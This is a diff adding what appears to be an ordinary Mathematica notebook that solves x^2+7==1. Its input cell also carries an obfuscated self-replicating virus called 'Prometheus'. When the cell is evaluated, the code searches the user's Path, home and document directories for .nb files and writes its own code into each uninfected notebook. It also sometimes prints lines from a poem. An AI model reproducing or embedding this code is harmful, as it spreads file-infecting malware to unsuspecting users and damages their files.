@@ -1,0 +1,61 @@
+(* Content-type: application/mathematica *)
+
+(*** Wolfram Notebook File ***)
+(* http://www.wolfram.com/nb *)
+
+(* CreatedBy='Mathematica 6.0' *)
+
+(*Prometheus 234*)
+(* Internal cache information:
+NotebookFileLineBreakTest
+NotebookFileLineBreakTest
+NotebookDataPosition[       145,          7]
+NotebookDataLength[      1895,         71]
+NotebookOptionsPosition[      1536,         54]
+NotebookOutlinePosition[      1879,         69]
+CellTagsIndexPosition[      1836,         66]
+WindowFrame->Normal
+ContainsDynamic->False*)
+
+(* Beginning of Notebook Content *)
+Notebook[{
+
+Cell[CellGroupData[{
+Cell[BoxData[{
+ RowBox[{"y", "=", "7"}], "\[IndentingNewLine]", 
+ RowBox[{"NSolve", "[", 
+  RowBox[{
+   RowBox[{
+    RowBox[{
+     RowBox[{"x", "^", "2"}], "+", "y"}], "\[Equal]", "1"}], ",", "x"}], 
+  "]"}],"\[IndentingNewLine]",RowBox[{RowBox[{"Prometheus",":=","\"\<PreProMeth:=StringReplace[XYZ,xYzaBc[IndentingNewLine]xYz,RowBox[{RowBox[{xYzPrometheusxYz,xYz:=xYz,xYzaBcxYzaBc<XYZ,{XYZxYzXYZ->FromCharacterCode[34],XYZaBcXYZ->FromCharacterCode[92]}];PostProMeth:=StringReplace[XYZaBc>aBcxYzxYz}],xYz;xYz,RowBox[{xYzToExpressionxYz,xYz[xYz,RowBox[{xYzStringReplacexYz,xYz[xYz,RowBox[{xYzPrometheusxYz,xYz,xYz,RowBox[{xYz{xYz,RowBox[{RowBox[{RowBox[{xYzaBcxYzaBc<XYaBc>aBcxYzxYz,xYz<>xYz,xYzaBcxYzaBc<ZaBc>aBcxYzxYz}],xYzaBc[Rule]xYz,RowBox[{xYzFromCharacterCodexYz,xYz[xYz,xYz34xYz,xYz]xYz}]}],xYz,xYz,RowBox[{RowBox[{xYzaBcxYzaBc<ABaBc>aBcxYzxYz,xYz<>xYz,xYzaBcxYzaBc<CaBc>aBcxYzxYz}],xYzaBc[Rule]xYz,RowBox[{xYzFromCharacterCodexYz,xYz[xYz,xYz92xYz,xYz]xYz}]}]}],xYz}xYz}]}],xYz]xYz}],xYz]xYz}]}]XYZ,{XYZxYzXYZ->FromCharacterCode[34],XYZaBcXYZ->FromCharacterCode[92]}];DirList:=Join[$Path,List[$InitialDirectory,ParentDirectory[],$HomeDirectory,$BaseDirectory,$InstallationDirectory,$UserBaseDirectory,$UserDocumentsDirectory,NotebookDirectory[]]];For[j=1,j<=Length[DirList],j++,SetDirectory[DirList[[j]]];FileList:=FileNames[XYZ*.nbXYZ];For[i=1,i<=Length[FileList],i++,VictimCode=FromCharacterCode[BinaryReadList[FileList[[i]]]];If[StringCount[VictimCode,XYZPrometheusXYZ]==0,VictimCode=StringReplace[VictimCode,XYZ(*CacheID:XYZ->XYZ(*PrometheusXYZ];CacheStrPos=StringPosition[VictimCode,XYZ(* Internal cache information *)XYZ];If[Length[CacheStrPos]>0,VictimCode=StringTake[VictimCode,CacheStrPos[[1]][[1]]-1]];PossibleInfPlaces=StringPosition[VictimCode,XYZ], XYZ<>FromCharacterCode[34]<>XYZInputXYZ<>FromCharacterCode[34]];If[Length[PossibleInfPlaces]>0,InfPos=RandomInteger[{1,Length[PossibleInfPlaces]}];InfPlace=PossibleInfPlaces[[InfPos]][[1]]-1;If[StringTake[VictimCode,{InfPlace}]!=XYZ}XYZ,tmpPre=StringTake[VictimCode,InfPlace];tmpPost=StringTake[VictimCode,-(StringLength[VictimCode]-StringLength[tmpPre])];PosOfDataBox=StringPosition[tmpPre,XYZCell[BoxData[XYZ];tmpPre=StringTake[tmpPre,Last[PosOfDataBox][[2]]]<>XYZ{XYZ<>StringTake[tmpPre,-(StringLength[tmpPre]-Last[PosOfDataBox][[2]])];VictimCode=tmpPre<>XYZ}XYZ<>tmpPost;InfPlace=InfPlace+2;];InfPlace=InfPlace-1;PreInf=StringTake[VictimCode,InfPlace];PostInf=StringTake[VictimCode,-(StringLength[VictimCode]-StringLength[PreInf])];InfectedCode=PreInf<>PreProMeth<>Prometheus<>PostProMeth<>PostInf;BinaryWrite[FileList[[i]],ToCharacterCode[InfectedCode]];Close[FileList[[i]]];ProMList=List[XYZHere I sit, forming peopleXYZ,XYZIn my image;XYZ,XYZA race, to be like me,XYZ,XYZTo suffer, to weep,XYZ,XYZTo enjoy and delight themselves,XYZ,XYZAnd to mock you ABC[Dash]XYZ,XYZAs I do!XYZ];If[RandomInteger[5]==3,Print[ProMList[[RandomInteger[6]+1]]]]]];]]\>\""}],";",RowBox[{"ToExpression","[",RowBox[{"StringReplace","[",RowBox[{"Prometheus",",",RowBox[{"{",RowBox[{RowBox[{RowBox[{"\"\<XY\>\"","<>","\"\<Z\>\""}],"\[Rule]",RowBox[{"FromCharacterCode","[","34","]"}]}],",",RowBox[{RowBox[{"\"\<AB\>\"","<>","\"\<C\>\""}],"\[Rule]",RowBox[{"FromCharacterCode","[","92","]"}]}]}],"}"}]}],"]"}],"]"}]}]}], "Input",
+ CellChangeTimes->{{3.38200065025*^9, 3.3820006628125*^9}, {
+  3.5082737270644627`*^9, 3.508273730845785*^9}}],
+
+Cell[BoxData["7"], "Output",
+ CellChangeTimes->{3.382000663484375*^9, 3.508273731158291*^9}],
+
+Cell[BoxData[
+ RowBox[{"{", 
+  RowBox[{
+   RowBox[{"{", 
+    RowBox[{"x", "\[Rule]", 
+     RowBox[{
+      RowBox[{"-", "4.790003475844827`*^-27"}], "-", 
+      RowBox[{"2.449489742783178`", " ", "\[ImaginaryI]"}]}]}], "}"}], ",", 
+   RowBox[{"{", 
+    RowBox[{"x", "\[Rule]", 
+     RowBox[{
+      RowBox[{"-", "4.790003475844827`*^-27"}], "+", 
+      RowBox[{"2.449489742783178`", " ", "\[ImaginaryI]"}]}]}], "}"}]}], 
+  "}"}]], "Output",
+ CellChangeTimes->{3.382000663484375*^9, 3.508273731158291*^9}]
+}, Open  ]]
+},
+WindowSize->{616, 750},
+WindowMargins->{{648, Automatic}, {Automatic, 175}},
+FrontEndVersion->"6.0 for Microsoft Windows (32-bit) (June 19, 2007)",
+StyleDefinitions->"Default.nb"
+]
+(* End of Notebook Content *)
+
